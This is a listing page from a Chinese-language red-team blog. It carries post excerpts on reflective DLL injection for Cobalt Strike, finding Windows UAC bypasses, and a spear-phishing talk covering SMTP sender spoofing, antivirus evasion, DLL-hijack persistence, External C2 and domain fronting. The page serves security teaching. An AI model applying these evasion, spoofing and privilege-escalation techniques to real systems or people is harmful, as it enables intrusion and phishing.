<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>倾旋的博客</title>
  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/page5/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="home">
  <a class="rss-link" href="/feed.xml">RSS Feed</a>
  <h1 class="page-heading">Articles</h1>

  <ul class="post-list">
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-02/1">通过反射DLL注入来构建后渗透模块（第一课）</a>
        </h2>
        
        <div class="post-meta">Mar 2, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="aggressor-script">Aggressor Script</h2>

<p>Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言，由<a href="http://sleep.dashnine.org/manual">Sleep</a>语言解析，Cobalt Strike 3.0以上版本的菜单、选项、事件都由default.cna构建。红队人员可以通过它来调用一些IRC、Webhook接口去对接机器人，实现自动化渗透与监控，Aggressor Script是Cobalt Strike这款C2平台的画龙点睛之笔。</p>

<p>对于Python、C/C++爱好者来说，Sleep语言一开始接触的时候感觉很奇怪，会有很多想吐槽的点，但久而久之，就会发现它的便捷之处。</p>

<h2 id="反射-dll注入">反射 DLL注入</h2>

<p>Aggressor Script脚本提供了一些关于反射DLL的接口：https://cobaltstrike.com/aggressor-script/functions.html#bdllspawn</p>

<p>话不多说，先上代码：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span> <span class="p">)</span> <span class="p">{</span>
	<span class="n">BOOL</span> <span class="n">bReturnValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="k">switch</span><span class="p">(</span> <span class="n">dwReason</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">case</span> <span class="n">DLL_QUERY_HMODULE</span><span class="p">:</span>
			<span class="k">if</span><span class="p">(</span> <span class="n">lpReserved</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span>
				<span class="o">*</span><span class="p">(</span><span class="n">HMODULE</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span> <span class="o">=</span> <span class="n">hAppInstance</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
			<span class="n">hAppInstance</span> <span class="o">=</span> <span class="n">hinstDLL</span><span class="p">;</span>
	
			<span class="cm">/* print some output to the operator */</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">lpReserved</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"Hello from test.dll. Parameter is '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">else</span> <span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"Hello from test.dll. There is no parameter</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="p">}</span>

			<span class="cm">/* flush STDOUT */</span>
			<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

			<span class="cm">/* we're done, so let's exit */</span>
			<span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
			<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">bReturnValue</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>很明显，这是一个DLL的主函数，在经过DLL_PROCESS_ATTACH的时候，开始执行代码。程序通过DLLMain函数的lpReserved来当做参数传递。</p>

<p>但光看一个DLLMain是看不出后面的奇妙的，我们把目光转向反射DLL注入技术的作者：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f04c037dcc364ac784c0a54a52bf0b3.png" alt="2020-03-01-11-25-55" /></p>

<p>这里有一个完整示例。</p>

<p>通过跟踪代码：https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/891f72baec3849d1f8cae20763e00556.png" alt="2020-03-01-11-26-06" /></p>

<p>发现该函数会寻找ReflectiveLoader这个导出函数的地址，然后直接创建一个远程线程执行这个函数，这个函数本身又会自动模拟整个LoadLibrary API，从而执行DLLMain，最终完成代码执行。</p>

<h2 id="开发自己的反射dll">开发自己的反射DLL</h2>

<p>首先，可以直接将反射DLL注入作者的项目拿过来使用：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8aa910e95941f5934e2a98b3a9ab2d27.png" alt="2020-03-01-11-26-50" /></p>

<p>接着就要编写cna脚本了。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/81ccd8a3292c89c284c7e12918c7cc8f.png" alt="2020-03-01-11-27-00" /></p>

<p>文件目录：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/33f98e3b30ff382ecceb8bea12117c78.png" alt="2020-03-01-11-27-08" /></p>

<p>通过Cobaltstrike加载后，可以执行reflective_dll在客户端弹出一个信息框。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f7f4ecea6989b990e7994eeee82a6e0e.png" alt="2020-03-01-11-27-21" /></p>

<p>整个过程是拥有极少的敏感行为特征，因此可以非常容易的绕过一些反病毒查杀。</p>

-->
          Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言....
          <p>
            <a class="post-link" href="/archivers/2020-03-02/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-02/2">红队分享-如何挖掘Windows Bypass UAC（第一课）</a>
        </h2>
        
        <div class="post-meta">Mar 2, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="什么是uac">什么是UAC</h2>

<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>

<p>先观察一下：</p>

<ul>
  <li>在Windows 7下打开注册表</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/412bdeb755c5a78985b38d5976577a58.png" alt="2020-03-01-11-29-43" /></p>

<ul>
  <li>在Windows 7上管理计算机</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/65232e2d81de975e7791842fc1b0b63c.png" alt="2020-03-01-11-29-52" /></p>

<ul>
  <li>在Windows 10上管理计算机</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2594d1172ddc6ee4d72ca3a039419eb6.png" alt="2020-03-01-11-30-00" /></p>

<p>有的需要授权、有的不需要，是因为UAC是分授权等级的：</p>

<p>首先请按Win+R，输入gpedit.msc，打开组策略。</p>

<p>然后我们在左侧窗口找到“计算机配置–Windows设置–安全设置–本地策略–安全选项”，再在右侧窗口找到“用户帐户控制： 管理员批准模式中管理员的提升权限提示的行为”，双击该条目，打开设置窗口，如下图：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/aa4fa85115717b88283aadbd700fcbf0.png" alt="2020-03-01-11-30-10" /></p>

<ul>
  <li>不提示直接提升：关闭UAC，需要权限时直接提升权限。</li>
  <li>在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。</li>
  <li>在安全桌面上同意提示：需要权限时在安全桌面上选择“允许”提升权限。</li>
  <li>提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。</li>
  <li>同意提示：需要权限时在普通窗口中选择“允许”提升权限。</li>
  <li>非 Windows 二进制文件的同意提示：(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择“允许”提升权限。</li>
</ul>

<h2 id="为什么有的应用程序不需要提示uac">为什么有的应用程序不需要提示UAC？</h2>

<p>因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。</p>

<p>如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在Linux中的相应操作类似。</p>

<ul>
  <li>程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力</li>
  <li>权限提升仅对此次进程有效</li>
</ul>

<p>提升权限的操作大致有两个：</p>

<ul>
  <li>自动提权请求</li>
  <li>手动提权请求</li>
</ul>

<p>手动提权就是“以管理员身份运行”，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器</p>

<p>在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。</p>

<h3 id="manifest文件">manifest文件</h3>

<p>这个文件本质上是一个XML文件，用于标识当前应用程序的配置属性。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/eaf0239b9dbc5bb5b0f6a9dacb0cf985.png" alt="2020-03-01-11-30-21" /></p>

<ul>
  <li>aslnvoker 默认权限</li>
  <li>highestAvailable 最高权限</li>
  <li>requireAdministrator 必须是管理员权限</li>
</ul>

<p>我编译选项调整为requireAdministrator,当用户运行程序后,将获得管理员权限会话,不需要绕过UAC了。</p>

<p>manifest中其实还有其他属性，如：autoElevate（自动提升）</p>

<p><strong>拥有自动权限提升属性的文件，当默认以管理员权限运行，不需要经过用户的授权。</strong></p>

<h2 id="寻找auto-elevate">寻找auto Elevate</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/37c15ae3fb7d66affb7d172b32198ba5.png" alt="2020-03-01-11-30-30" /></p>

<p>通过不断遍历autoElevate属性，寻找自动权限提升的程序。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/99743a7f38e0aa56e45b18be256dbc0b.png" alt="2020-03-01-11-30-37" /></p>

<p>我使用Powershell启动：C:\Windows\system32\eudcedit.exe</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/63facf6935301fc41e3b02d559a24a15.png" alt="2020-03-01-11-30-50" /></p>

<p>发现没有弹出UAC确认，没有继承Powershell的权限，它的权限是High。</p>

<p>假设，如果C:\Windows\system32\eudcedit.exe存在一个DLL劫持漏洞，那么普通用户就可以用低权限绕过UAC确认，以高权限执行任意代码。</p>

<h2 id="手动bypass-uac">手动Bypass UAC</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/035c74375c2d96d374215a67df8b438a.png" alt="2020-03-01-11-31-01" /></p>

<p>C:\Windows\system32\odbcad32.exe 该程序用于配置ODBC数据源，但提供了一个输入点，那就是文件浏览器，通过文件浏览器我们可以打开一个管理员权限的Powershell。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1beb7da54c1e299d3e440c9533af0b26.png" alt="2020-03-01-11-31-10" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0c51fb72ea742a28feaaf82f8faad857.png" alt="2020-03-01-11-31-20" /></p>

<p>使用Powershell启动其他程序，也都是以管理员权限运行：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c7d5be0762304ea7b1dcf538e89d0340.png" alt="2020-03-01-11-31-27" /></p>

<p>下一章，将分析几个UAC的绕过例子。</p>
-->
          用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。
          <p>
            <a class="post-link" href="/archivers/2020-03-02/2">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-02-05/1">红队行动之鱼叉攻击-研究分享</a>
        </h2>
        
        <div class="post-meta">Feb 5, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="演讲简介">演讲简介</h2>

<p>《红队行动之鱼叉攻击》围绕着SMTP协议展开，为大家介绍SMTP相关的安全协议，同时会讲解鱼叉攻击的整体过程，以及模拟APT报告进行自动化、武器化的设计。在讲解的过程中，核心围绕Domain-Fronting和External C2这两类红队较为关注的技术，穿插一些HTTP协议相关的基础知识和木马的编写构建。</p>

<h2 id="演讲目标">演讲目标</h2>

<p>为大家分享SMTP协议相关的基础知识，使大家对邮件安全有一定了解，对未来可能遇到的邮件安全相关问题做一个知识储备，同时也更希望能让大家感受火热的技术氛围，热爱红队、热爱研究，不断攻克工作中遇到的难题。</p>

<h2 id="鱼叉攻击概念">鱼叉攻击概念</h2>

<p>“鱼叉攻击”通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。</p>

<p>在2019年的上半年，安全客上披露了穷奇、海莲花这两个APT组织的攻击活动</p>

<h3 id="穷奇毒云藤">穷奇（毒云藤）</h3>

<p>穷奇组织是一个对我国持续攻击时间长达数十年的老牌APT组织，该组织的攻击活动在2015年左右达到高峰，之后的活动慢慢减少，2019年以来该组织活动减少了很多，攻击频次和攻击范围都大大缩小，但其依然保持活动，如2019年3月份，该组织就使用编号为CVE-2018-20250的WinRAR ACE漏洞向中国大陆数十个重点目标投递了多个RAT木马。投递的RAT木马核心与3年前的版本相比除了配置信息外并未发现新的功能性更新，由此也可印证该组织的活跃度确实在下降。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0a544ba8a29ef61667aa9b7e19a44b85.png" alt="2020-02-05-07-04-37" /></p>

<h3 id="海莲花apt32oceanlotus">海莲花（APT32、OceanLotus）</h3>

<p>其攻击的目标众多且广泛，包括政府部门、大型国企、金融机构、科研机构以及部分重要的私营企业等。该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/691024d79afc5be173b2f962359f3181.png" alt="2020-02-05-07-05-36" /></p>

<h2 id="鱼叉攻击背后的攻击链路">鱼叉攻击背后的攻击链路</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/cada800e5a269216c8a1468c8f57a7d4.png" alt="2020-02-05-07-05-47" /></p>

<p>通常情况下，黑客通过投递邮件到目标邮件服务器，受害者接收后，经受邮件的诱惑、欺骗，会尝试运行邮件附带的木马，最后进入模块化加载的过程。其中，APT组织在木马模块化的构建过程中，会采用穿插多种复杂的技术以及文件格式，涉及加密解密、Shellcode隐写混淆、反射DLL加载、DLL注入、系统特性等。</p>

<p>经历过木马模块化的过程后，转而进入C2环节，<strong>“C2环节占了红队的大部分工作周期”</strong>，通过C2环节来横向攻击，对目标进行长期的摸排，寻找数据再进而获取数据，这就是整个红队鱼叉的过程。</p>

<h2 id="smtp协议简介">SMTP协议简介</h2>

<p>简单邮件传输协议 (Simple Mail Transfer Protocol, SMTP) 是在Internet传输email的事实标准。</p>

<p>RFC821：https://tools.ietf.org/html/rfc821</p>

<ul>
  <li>SMTP默认端口：25</li>
  <li>SSL SMTP默认端口：465</li>
</ul>

<h3 id="smtp相关安全协议---spf">SMTP相关安全协议 - SPF</h3>

<p>发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。</p>

<p>https://www.ietf.org/rfc/rfc4408.txt</p>

<p><code class="language-plaintext highlighter-rouge">"v=spf1 mx ip4:61.0.2.0/24 ~all"</code></p>

<p>设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。</p>

<h3 id="smtp相关安全协议---dkim">SMTP相关安全协议 - DKIM</h3>

<p>DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。</p>

<p>https://tools.ietf.org/html/rfc6376</p>

<h3 id="smtp相关安全协议---dmarc">SMTP相关安全协议 - DMARC</h3>

<p>DMARC（Domain-based Message Authentication, Reporting &amp; Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5d376d3813e4dde41c53e82cd74faf93.png" alt="2020-02-05-07-06-09" /></p>

<p>https://en.wikipedia.org/wiki/DMARC#Alignment</p>

<h2 id="smtp基础报文结构">SMTP基础报文结构</h2>

<p>这个报文结构需要拿出来重点的阐述一下。</p>

<p>以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。</p>

<p>在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：</p>

<ul>
  <li>信封</li>
  <li>信的内容</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d66df571821f7b0fcb19d930f8c985ba.png" alt="2020-02-05-07-06-19" /></p>

<p>注意观察，其中信封中有MAIL FROM，而信的内容中，也有MAIL FROM，这时问题就出现了。</p>

<h2 id="smtp-relay欺骗攻击">SMTP Relay欺骗攻击</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e6b492b28be26612d1ca960f74e6b3d4.png" alt="2020-02-05-07-06-29" /></p>

<p>通过比对STMP两个报文，我们可以发现，右边的报文中的From信的内容被更改了，此时当B@examle2.com收到的邮件就是P@example3.com发送过来的。</p>

<p>修改From后的邮件会经过邮件网关的检查并且符合邮件服务器配置的安全协议，最终到达邮件客户端。其中邮件客户端可以是浏览器、也可以是邮件客户端软件，一般情况下，邮件客户端是不具备邮件安全协议验证的，因此在客户端会解析成正常邮件。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ea5fdfaffa6f027756758161c14e7488.png" alt="2020-02-05-07-06-49" /></p>

<p>上图中，我的邮箱地址并不是To，但被穿透进入了我的收件箱。</p>

<p>在早期我还写过类似的介绍：<a href="https://payloads.online/archivers/2019-05-09/1">Swaks伪造邮件</a></p>

<p>通过Swaks可以发送简单的邮件来做测试，说了那么多，SMTP Relay有什么办法防御呢？</p>

<h2 id="relay技术穿透">Relay技术穿透</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0c2444d56e6bfe9afbc9046c3eb57576.png" alt="2020-02-05-07-07-03" /></p>

<p>SMTP Relay技术无法穿透配置有DMARC的安全协议的邮件服务。</p>

<h3 id="dmarc-的运作方式">DMARC 的运作方式</h3>

<p>DMARC 会验证发件人的域名，从而协助电子邮件发件人和收件人验证传入的邮件。DMARC 还定义了应该对传入的可疑邮件执行哪些操作。</p>

<p>要通过 DMARC 检查，必须满足以下条件：</p>

<ul>
  <li>传入的邮件必须通过 SPF 或/和 DKIM 的身份验证。</li>
  <li>邮件的发件人：（From:）标头地址中的域名必须与经过身份验证的域名一致。</li>
</ul>

<p>https://support.google.com/a/answer/2466580?hl=zh-Hans&ref_topic=7562942</p>

<h2 id="smtp-relay-基础设施构建">SMTP Relay 基础设施构建</h2>

<p>在这个环节中，需要搭建一个邮件服务器用于转发邮件，其次还需要考虑对C2进行构建、编写。</p>

<p>首先来说邮件服务器，我们可以搭建一个支持SPF、DKIM的邮件服务器，但是搭建起来太麻烦了，是否有符合我们需要的现成的邮件服务器呢？这里可以选择一些免费的企业邮箱服务器，它们的宽容度足够高。宽容度指的是：对垃圾邮件的处理、对邮件安全协议的兼容程度比较高。当邮件服务器接收或者发送一封邮件时，会检查邮件内容，同时收到邮件后，会检测是否支持SPF、DKIM、DMARC，这三者可能大多数发送方邮件服务器都不满足，因此会着重检测SPF，由此说来，SPF是比较重要的一个邮件安全协议且我们仅仅支持SPF、DKIM即可。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d2c1d321c16c27a06524b90f03d620b1.png" alt="2020-02-05-07-08-07" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3de0417f2e45bcf5ea16a356879ba35f.png" alt="2020-02-05-07-08-28" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/989c7a5c59ec67cd06d3cce1a6a08554.png" alt="2020-02-05-07-08-37" /></p>

<p>上图是通过swaks来登录一个邮件服务器，去向我的Gmail发送一封邮件，伪造linux.org的邮箱，成功进入收件箱。</p>

<h2 id="c2构建思路">C2构建思路</h2>

<h3 id="c2零接触概念">C2零接触概念</h3>

<ul>
  <li>面对IP封禁、IOC标记等这种临时的处置措施，如何持续控制目标？</li>
  <li>能否有一种技术，使得C2服务器不直接与被控目标直接交互？</li>
</ul>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b19849cf41e0ec85a21171e1fc9b97d6.png" alt="2020-02-05-07-09-06" /></p>

<p>这里先抛出一个问题，后续我们展开来讲。</p>

<p>再来说说对木马的构建。</p>

<h3 id="期望木马达到的效果--免杀">期望木马达到的效果 – 免杀</h3>

<p>免杀的技术已经很多了，而我更喜欢在源码层面进行修改达到免杀，或者自己去写混淆之类的。</p>

<p>常用的技术如下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bad79fc62bd2c15dd28e954a5e4afc83.png" alt="2020-02-05-07-09-16" /></p>

<ul>
  <li><a href="https://payloads.online/archivers/2019-11-10/1">静态恶意代码逃逸（第一课）</a></li>
  <li><a href="https://payloads.online/archivers/2019-11-10/2">静态恶意代码逃逸（第二课）</a></li>
  <li><a href="https://payloads.online/archivers/2019-11-10/3">静态恶意代码逃逸（第三课）</a></li>
  <li><a href="https://payloads.online/archivers/2019-11-10/4">静态恶意代码逃逸（第四课）</a></li>
  <li><a href="https://payloads.online/archivers/2019-11-10/5">静态恶意代码逃逸（第五课）</a></li>
  <li><a href="https://payloads.online/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a></li>
</ul>

<p>以上六课是我通过代码层面做的免杀落地，最后一种经常使用，免杀效果很好，文章系列我会继续更新。</p>

<h3 id="期望木马达到的效果--免杀-pe加载">期望木马达到的效果 – 免杀 PE加载</h3>

<p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>

<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己的程序代码进行解析，并把不同的节数据加载到对应的内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者、游戏厂商使用比较广泛。</p>

<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>

<p>MemoryModule就是实现了这个核心过程：https://github.com/fancycode/MemoryModule</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/77800fcfa89527e4f5bdba214869e190.png" alt="2020-02-05-07-11-25" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/79860841477e1b8bfb894860f5562e37.png" alt="2020-02-05-07-11-37" /></p>

<p>详见： <a href="https://payloads.online/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a></p>

<h3 id="期望木马达到的效果--体积小">期望木马达到的效果 – 体积小</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/24eb3387781d14efbb72259db1ba55a8.png" alt="2020-02-05-07-11-57" /></p>

<p>这里主要是在编译前和编译后做一些注意事项，例如静态改为动态编译、压缩壳、远程加载等等。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a9123a62c737b05cbea3c8afbde2b26b.png" alt="2020-02-05-07-12-06" /></p>

<p>如果是调用系统的API，则使用动态链接库代替静态链接。</p>

<h3 id="期望木马达到的效果--持久可控">期望木马达到的效果 – 持久可控</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1429878dbf6bd4166b03882c5ce2d89a.png" alt="2020-02-05-07-12-15" /></p>

<p>这块基本上没什么好展开的，其中 白利用DLL劫持是我经常使用的。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6dea054d85f6972d3c8a6e18581a8b48.png" alt="2020-02-05-07-12-24" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/37b20142495c2bab2388ec11aee3769a.png" alt="2020-02-05-07-12-34" /></p>

<h3 id="期望木马达到的效果--uac">期望木马达到的效果 – UAC</h3>

<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1f8cbe00340d31040073be9b06833e24.png" alt="2020-02-05-07-12-47" /></p>

<p>在编译前,可以直接控制程序启动权限:</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ff07ce6be73ff264b35391c1ed969ebc.png" alt="2020-02-05-07-12-55" /></p>

<ul>
  <li>aslnvoker 默认权限</li>
  <li>highestAvailable 最高权限</li>
  <li>requireAdministrator 必须是管理员权限</li>
</ul>

<p>我编译选项调整为requireAdministrator,当用户运行程序后,将获得管理员权限会话,不需要绕过UAC了.</p>

<h2 id="cobalt-strike">Cobalt Strike</h2>

<p>Cobalt Strike是目前应用最多的一款红队C2平台，它的高扩展性、信息同步、网络架构得到很多红队的青睐。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e320cfd0c5bfb563f43f2d9f3c4f090c.png" alt="2020-02-05-07-13-06" /></p>

<h3 id="external-c2">External C2</h3>

<p>Cobaltstrike External C2 旨在开发者可以通过扩展C2的模型来开发适配不同环境的C2使得目标上线。</p>

<ul>
  <li>场景一：解决Web服务器不出网的情况下使得目标上线Cobaltstrike - Jsp php aspx</li>
  <li>场景二：内网某台服务器横向的过程中，无法出网，只能通过SMB服务传递数据</li>
  <li>场景三：通过其他特有的协议，如outlook、网页、Websocket控制目标服务器</li>
  <li>场景四：其他各种协议</li>
  <li>场景五：某个目标溯源到C2，同步到多个目标，或C2被威胁情报标记，被封，所有会话丢失 - 应对红蓝对抗</li>
</ul>

<p>文档链接：https://www.cobaltstrike.com/downloads/externalc2spec.pdf</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c20c3393159eb2aa1ffe5635280a4248.png" alt="2020-02-05-07-13-18" /></p>

<p>关于External C2就不展开说了,官方文档已经很详细</p>

<h3 id="external-c2-执行流程">External C2 执行流程</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/393d1ab6bfaa3d0f80b04d5dac7dfb6a.png" alt="2020-02-05-07-13-26" /></p>

<p>当客户端请求到控制器后,控制器将会向External C2去请求Stage,这个Stage就是一个DLL文件,将DLL文件拿到客户端内存中后,申请可执行内存页,创建线程即可运行,其中,这个DLL是使用了反射DLL加载技术.</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/52f375a450f513137c3c6f049500aed4.png" alt="2020-02-05-07-13-40" /></p>

<h2 id="domain-fronting">Domain Fronting</h2>

<p>域前置技术（Domain-Fronting）是一个能够利用CDN识别域名进行转发流量的特性来隐藏命令控制（Command &amp; Control ，C&amp;C）的一种技术。</p>

<p>根据本次议题,我最终实现的C2模型如下:</p>

